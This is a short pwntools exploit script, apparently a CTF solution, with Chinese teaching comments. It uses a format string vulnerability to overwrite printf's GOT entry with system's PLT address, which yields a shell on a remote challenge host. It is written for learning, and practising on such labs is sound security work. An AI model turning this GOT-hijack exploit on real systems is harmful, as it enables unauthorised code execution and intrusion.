from pwn import *
from LibcSearcher import *

#context(arch = "amd64",os = 'linux',log_level = 'debug')
context(arch = "i386", os = 'linux', log_level = 'debug')

#io = process("./pwn")
io = remote('pwn.challenge.ctf.show', 28109)
elf = ELF("./pwn")
libc = ELF('./libc.so.6')

# test = b'aaaa' + b'%p--' * 10：用于测试格式化字符串的偏移量
test = b'aaaa' + b'%p--' * 10

# offset = 6：格式化字符串的偏移量，即第6个参数开始是我们可控的数据
offset = 6

# printf_got = elf.got['printf']：printf函数的GOT表地址
printf_got = elf.got['printf']

# system_plt = elf.plt['system']：system函数的PLT表地址
system_plt = elf.plt['system']

# payload = fmtstr_payload(offset, {printf_got:system_plt})：构造格式化字符串payload
# 将printf的GOT表地址覆盖为system函数的PLT地址
payload = fmtstr_payload(offset, {printf_got:system_plt})

io.sendline(payload)
io.interactive()

"""
【知识点讲解】
1. 题目类型：fmtstr - 格式化字符串漏洞 + GOT表劫持
2. 核心原理：
   - 利用格式化字符串漏洞覆盖GOT表中的函数地址
   - 将printf函数的GOT表项修改为system函数的地址
3. 关键参数：
   - offset = 6：格式化字符串的偏移量
   - {printf_got:system_plt}：将printf的GOT表地址覆盖为system的PLT地址
4. 执行流程：
   - 构造格式化字符串payload
   - 发送payload触发漏洞
   - 当程序再次调用printf时，实际上会执行system函数
5. GOT表劫持原理：
   - GOT（Global Offset Table）存储了动态链接函数的实际地址
   - 通过覆盖GOT表，可以将函数调用重定向到其他函数
   - 这里将printf重定向到system，当程序调用printf("/bin/sh")时会执行system("/bin/sh")
"""
